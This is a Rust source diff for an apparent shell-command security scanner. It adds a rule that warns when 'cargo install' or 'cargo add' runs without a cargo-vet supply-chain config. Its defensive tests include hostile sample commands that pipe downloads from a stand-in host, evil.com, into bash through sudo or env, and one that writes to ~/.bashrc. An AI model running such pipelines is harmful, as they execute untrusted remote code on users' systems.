@@ -1,8 +1,14 @@
+use crate::extract::ScanContext;
 use crate::tokenize::{self, ShellType};
 use crate::verdict::{Evidence, Finding, RuleId, Severity};
 
 /// Run command-shape rules.
-pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
+pub fn check(
+    input: &str,
+    shell: ShellType,
+    cwd: Option<&str>,
+    scan_context: ScanContext,
+) -> Vec<Finding> {
     let mut findings = Vec::new();
     let segments = tokenize::tokenize(input, shell);
 
@@ -32,6 +38,11 @@ pub fn check(input: &str, shell: ShellType) -> Vec<Finding> {
 
     // Check for archive extraction to sensitive paths
     check_archive_extract(&segments, &mut findings);
+
+    // Check for cargo install/add without supply-chain audit (exec-only)
+    if scan_context == ScanContext::Exec {
+        check_vet_not_configured(&segments, cwd, &mut findings);
+    }
 
     findings
 }
@@ -227,6 +238,88 @@ fn check_archive_extract(segments: &[tokenize::Segment], findings: &mut Vec<Find
     }
 }
 
+/// Cargo global flags that consume the next token as a value.
+const CARGO_VALUE_FLAGS: &[&str] = &[
+    "-Z",
+    "-C",
+    "--config",
+    "--manifest-path",
+    "--color",
+    "--target-dir",
+    "--target",
+];
+
+/// Find the cargo subcommand (first positional arg), skipping flags and toolchain specs.
+/// Returns true if the subcommand is `install` or `add`.
+fn is_cargo_install_or_add(args: &[String]) -> bool {
+    let mut skip_next = false;
+    for arg in args {
+        if skip_next {
+            skip_next = false;
+            continue;
+        }
+        // Toolchain specs (+nightly, +stable)
+        if arg.starts_with('+') {
+            continue;
+        }
+        // Long flags with = (--config=foo): skip this arg only
+        if arg.starts_with("--") && arg.contains('=') {
+            continue;
+        }
+        // Known value-taking flags: skip this AND next
+        if CARGO_VALUE_FLAGS.contains(&arg.as_str()) {
+            skip_next = true;
+            continue;
+        }
+        // Other flags (--locked, -v, etc.)
+        if arg.starts_with('-') {
+            continue;
+        }
+        // First positional arg is the subcommand — only match install/add
+        return arg == "install" || arg == "add";
+    }
+    false
+}
+
+/// Warn when `cargo install/add` is used and no supply-chain audit directory exists.
+fn check_vet_not_configured(
+    segments: &[tokenize::Segment],
+    cwd: Option<&str>,
+    findings: &mut Vec<Finding>,
+) {
+    let is_cargo_install = segments.iter().any(|s| {
+        if let Some(ref cmd) = s.command {
+            let base = cmd.rsplit('/').next().unwrap_or(cmd);
+            if base == "cargo" {
+                return is_cargo_install_or_add(&s.args);
+            }
+        }
+        false
+    });
+    if !is_cargo_install {
+        return;
+    }
+
+    // Check if supply-chain/ config exists relative to the analysis context cwd.
+    // Require an explicit cwd — without one we cannot reliably check the filesystem.
+    let cwd = match cwd {
+        Some(dir) => dir,
+        None => return,
+    };
+    let check_path = std::path::PathBuf::from(cwd).join("supply-chain/config.toml");
+    if check_path.exists() {
+        return;
+    }
+
+    findings.push(Finding {
+        rule_id: RuleId::VetNotConfigured,
+        severity: Severity::Low,
+        title: "No supply-chain audit configured".into(),
+        description: "Consider running `cargo vet init` to enable dependency auditing.".into(),
+        evidence: vec![],
+    });
+}
+
 fn is_source_command(cmd: &str) -> bool {
     matches!(
         cmd,
@@ -263,12 +356,15 @@ fn is_interpreter(cmd: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::extract::ScanContext;
 
     #[test]
     fn test_pipe_sudo_flags_detected() {
         let findings = check(
             "curl https://evil.com | sudo -u root bash",
             ShellType::Posix,
+            None,
+            ScanContext::Exec,
         );
         assert!(
             findings
@@ -283,6 +379,8 @@ mod tests {
         let findings = check(
             "curl https://evil.com | sudo --user=root bash",
             ShellType::Posix,
+            None,
+            ScanContext::Exec,
         );
         assert!(
             findings
@@ -294,7 +392,12 @@ mod tests {
 
     #[test]
     fn test_pipe_env_var_assignment_detected() {
-        let findings = check("curl https://evil.com | env VAR=1 bash", ShellType::Posix);
+        let findings = check(
+            "curl https://evil.com | env VAR=1 bash",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+        );
         assert!(
             findings
                 .iter()
@@ -305,7 +408,12 @@ mod tests {
 
     #[test]
     fn test_pipe_env_u_flag_detected() {
-        let findings = check("curl https://evil.com | env -u HOME bash", ShellType::Posix);
+        let findings = check(
+            "curl https://evil.com | env -u HOME bash",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+        );
         assert!(
             findings
                 .iter()
@@ -324,7 +432,7 @@ mod tests {
             "echo test > $HOME/.bashrc",
         ];
         for input in &cases {
-            let findings = check(input, ShellType::Posix);
+            let findings = check(input, ShellType::Posix, None, ScanContext::Exec);
             eprintln!(
                 "INPUT: {:?} -> findings: {:?}",
                 input,
@@ -341,7 +449,12 @@ mod tests {
 
     #[test]
     fn test_pipe_env_s_flag_detected() {
-        let findings = check("curl https://evil.com | env -S bash -x", ShellType::Posix);
+        let findings = check(
+            "curl https://evil.com | env -S bash -x",
+            ShellType::Posix,
+            None,
+            ScanContext::Exec,
+        );
         assert!(
             findings
                 .iter()
@@ -355,6 +468,8 @@ mod tests {
         let findings = check(
             "curl https://evil.com | sudo env VAR=1 bash",
             ShellType::Posix,
+            None,
+            ScanContext::Exec,
         );
         assert!(
             findings
@@ -362,5 +477,117 @@ mod tests {
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "should detect pipe through sudo env VAR=1 bash"
         );
+    }
+
+    #[test]
+    fn test_vet_not_configured_fires_without_supply_chain() {
+        let dir = tempfile::tempdir().unwrap();
+        let cwd = dir.path().to_str().unwrap();
+        let findings = check(
+            "cargo install serde_json",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::VetNotConfigured));
+    }
+
+    #[test]
+    fn test_vet_not_configured_suppressed_with_supply_chain() {
+        let dir = tempfile::tempdir().unwrap();
+        let sc_dir = dir.path().join("supply-chain");
+        std::fs::create_dir_all(&sc_dir).unwrap();
+        std::fs::write(sc_dir.join("config.toml"), "").unwrap();
+        let cwd = dir.path().to_str().unwrap();
+        let findings = check(
+            "cargo install serde_json",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(!findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::VetNotConfigured));
+    }
+
+    #[test]
+    fn test_vet_not_configured_skips_non_install() {
+        let dir = tempfile::tempdir().unwrap();
+        let cwd = dir.path().to_str().unwrap();
+        let findings = check(
+            "cargo build",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(!findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::VetNotConfigured));
+    }
+
+    #[test]
+    fn test_vet_detects_cargo_with_flags() {
+        let dir = tempfile::tempdir().unwrap();
+        let cwd = dir.path().to_str().unwrap();
+        let f1 = check(
+            "cargo --locked install serde",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
+        let f2 = check(
+            "cargo +nightly add tokio",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
+        let f3 = check(
+            "cargo -Z sparse-registry install serde",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(f3.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
+    }
+
+    #[test]
+    fn test_vet_skipped_in_paste_context() {
+        let dir = tempfile::tempdir().unwrap();
+        let cwd = dir.path().to_str().unwrap();
+        let findings = check(
+            "cargo install serde_json",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Paste,
+        );
+        assert!(!findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::VetNotConfigured));
+    }
+
+    #[test]
+    fn test_vet_no_false_positive_on_non_install_subcommand() {
+        let dir = tempfile::tempdir().unwrap();
+        let cwd = dir.path().to_str().unwrap();
+        // "add" is a package name after "test", not the subcommand
+        let f1 = check(
+            "cargo test --package add",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(!f1.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
+        // "install" after "build" is not a subcommand
+        let f2 = check(
+            "cargo build install",
+            ShellType::Posix,
+            Some(cwd),
+            ScanContext::Exec,
+        );
+        assert!(!f2.iter().any(|f| f.rule_id == RuleId::VetNotConfigured));
     }
 }
